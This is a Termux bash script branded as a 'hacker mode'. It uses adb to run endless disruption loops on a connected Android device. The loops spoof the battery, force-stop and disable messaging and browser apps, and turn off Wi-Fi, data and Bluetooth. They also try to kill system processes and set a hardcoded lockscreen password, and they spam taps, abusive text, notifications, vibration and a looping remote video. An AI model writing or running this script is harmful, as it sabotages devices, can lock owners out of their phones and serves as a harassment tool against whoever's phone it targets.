#!/data/data/com.termux/files/usr/bin/bash
# 𝕴 𝖆𝖒 𝖍𝖎𝖒 Ultimate Omega Hacker Mode - Termux installer + runner
# VERY DISRUPTIVE. Run only on your own device.

echo "Starting 𝕴 𝖆𝖒 𝖍𝖎𝖒 Ultimate Omega Hacker Mode..."
echo "Panic-stop file = /sdcard/omega_stop (create this file to stop script gracefully)"

# ----------------------------
# Install dependencies (Termux)
# ----------------------------
pkg update -y && pkg upgrade -y
# android-tools provides adb; install coreutils and others
pkg install -y android-tools nano wget git coreutils

# Start adb server (harmless if already running)
adb start-server 2>/dev/null || true

# ----------------------------
# Helper: try a command, warn if fails (no abort)
# ----------------------------
try_cmd() {
  "$@" 2>/dev/null || echo "[WARN] Command failed: $*"
}

# ----------------------------
# Helper: detect screen size (fallback defaults)
# ----------------------------
get_screen_size() {
  size="$(adb shell wm size 2>/dev/null | tr -d '\r')"
  if [[ "$size" =~ ([0-9]+)x([0-9]+) ]]; then
    W="${BASH_REMATCH[1]}"
    H="${BASH_REMATCH[2]}"
  else
    W=1080
    H=1920
  fi
}

# ----------------------------
# Panic check helper: returns 0 if should continue, 1 if stop
# ----------------------------
panic_check() {
  # check for file on primary shared storage
  if [ -f "/sdcard/omega_stop" ] || [ -f "$HOME/omega_stop" ]; then
    echo "[PANIC] Stop file detected. Exiting loop."
    return 1
  fi
  return 0
}

# ----------------------------
# Lock password (will be attempted)
# ----------------------------
LOCKPASS='iamhim957'

# ----------------------------
# MAIN CHAOS BLOCK (infinite) -- runs in background
# ----------------------------
(
while true; do
  panic_check || break
  echo "=== MAIN CHAOS CYCLE ==="

  # Battery shenanigans
  try_cmd adb shell dumpsys battery set level 0
  try_cmd adb shell dumpsys battery set level 999
  try_cmd adb shell dumpsys battery unplugged

  # Kill apps (attempt)
  try_cmd adb shell am force-stop com.android.chrome
  try_cmd adb shell am force-stop com.facebook.katana
  try_cmd adb shell pm disable-user com.whatsapp || echo "[WARN] pm disable-user may fail without privileges"

  # small wait & panic check
  sleep 1
  panic_check || break

  # Kill networks (attempt)
  try_cmd adb shell svc wifi disable
  try_cmd adb shell svc data disable
  try_cmd adb shell svc bluetooth disable

  sleep 1
  panic_check || break

  # Mess with system (attempt; likely fails without root)
  try_cmd adb shell stop || echo "[WARN] adb shell stop failed (requires root)"
  sleep 2
  try_cmd adb shell killall com.android.systemui || echo "[WARN] killall SystemUI failed (requires root)"

  # Lockscreen password attempt (may require root/device-owner)
  try_cmd adb shell locksettings set-password "$LOCKPASS" && echo "[OK] Tried set lock password: $LOCKPASS" || echo "[WARN] locksettings set-password failed"

  # Airplane toggle
  try_cmd adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true
  sleep 2
  try_cmd adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false

  # Random insane numbers (settings)
  try_cmd adb shell settings put global airplane_mode_on 9999
  try_cmd adb shell settings put system screen_brightness 99999


  echo "Main chaos cycle done."
  sleep 1
done
echo "[MAIN] Exiting main chaos block."
) &

# ----------------------------
# EXTRA CHAOS BLOCK (infinite) -- vibrations, swipes, taps, rotation, brightness, volume, apps, notifications
# ----------------------------
(
echo "[ADDON] 𝕴 𝖆𝖒 𝖍𝖎𝖒 add-on activated..."
get_screen_size
echo "[INFO] Detected screen size: ${W}x${H}"

while true; do
  panic_check || break

  # Vibrate: repeated short bursts (more compatible)
  for i in {1..10}; do
    panic_check || break
    try_cmd adb shell cmd vibrator vibrate 1000 || echo "[WARN] vibrator may fail"
    sleep 0.2
  done

  panic_check || break

  # Brightness flicker
  b=$((RANDOM % 256))
  try_cmd adb shell settings put system screen_brightness $b

  panic_check || break

  # Random swipes
  get_screen_size
  for i in {1..8}; do
    panic_check || break
    x1=$((RANDOM % W)); y1=$((RANDOM % H))
    x2=$((RANDOM % W)); y2=$((RANDOM % H))
    dur=$((100 + RANDOM % 900))
    try_cmd adb shell input swipe $x1 $y1 $x2 $y2 $dur
    sleep 0.08
  done

  panic_check || break

  # Tiny shake swipes
  for i in {1..6}; do
    panic_check || break
    cx=$((W/2 + RANDOM % 50 - 25))
    cy=$((H/2 + RANDOM % 50 - 25))
    try_cmd adb shell input swipe $cx $cy $((cx+20)) $((cy+8)) 80
    sleep 0.05
  done

  panic_check || break

  # Random taps
  for i in {1..10}; do
    panic_check || break
    xt=$((RANDOM % W)); yt=$((RANDOM % H))
    try_cmd adb shell input tap $xt $yt
    sleep 0.06
  done

  panic_check || break

  # Keyboard spam into active field
  spam=("fuckyou" "iamhim" "hello" "omega")
  msg="${spam[$RANDOM % ${#spam[@]}]}"
  try_cmd adb shell input text "$msg"
  try_cmd adb shell input keyevent 66

  panic_check || break

  # Volume to max: try API then fallback to keyevents
  try_cmd adb shell media volume --stream 3 --set 15 2>/dev/null || \
  (for n in $(seq 1 12); do try_cmd adb shell input keyevent 24; sleep 0.02; done)

  panic_check || break

  # Random app launch
  apps=("com.android.settings" "com.android.chrome" "com.whatsapp" "com.facebook.katana" "com.termux")
  app=${apps[$RANDOM % ${#apps[@]}]}
  try_cmd adb shell monkey -p $app -c android.intent.category.LAUNCHER 1

  panic_check || break

  # Notification spam (attempt)
  tag="omegaTag$((RANDOM%1000))"
  title="𝕴 𝖆𝖒 𝖍𝖎𝖒"
  body="You are being haunted."
  try_cmd adb shell cmd notification post -S bigtext "$tag" "$title" "$body" || \
  try_cmd adb shell am broadcast -a android.intent.action.SEND --es msg "$body"

  panic_check || break

  # Screen rotation random
  r=$((RANDOM % 4))
  try_cmd adb shell settings put system user_rotation $r

  # Screen toggle
  for i in {1..3}; do
    panic_check || break
    try_cmd adb shell input keyevent 26
    sleep 0.4
  done

  # Wi-Fi quick toggle
  try_cmd adb shell svc wifi disable
  sleep 0.2
  try_cmd adb shell svc wifi enable

  # short random pause
  sleep $((1 + RANDOM % 3))
done
echo "[ADDON] Exiting add-on block."
) &

# ----------------------------
# INFINITE VIDEO LOOP (single direct .mp4 link)
# ----------------------------
(
# Replace with your direct .mp4 (catbox) link
VIDEO_URL="https://files.catbox.moe/3sejqe.mp4"

echo "[VIDEO] Starting infinite video loop (URL=${VIDEO_URL})"
while true; do
  panic_check || break
  # ensure volume high before launching
  try_cmd adb shell media volume --stream 3 --set 15 2>/dev/null || \
  (for n in $(seq 1 12); do try_cmd adb shell input keyevent 24; sleep 0.02; done)

  # launch video player / browser to the direct MP4
  try_cmd adb shell am start -a android.intent.action.VIEW -d "$VIDEO_URL" -t "video/*"
  sleep 5
done
echo "[VIDEO] Exiting video loop."
) &

# ----------------------------
# Wait for background jobs (and allow panic-stop)
# ----------------------------
# wait for any job to finish (jobs run until panic-stop or manual kill)
wait

echo "Script terminated."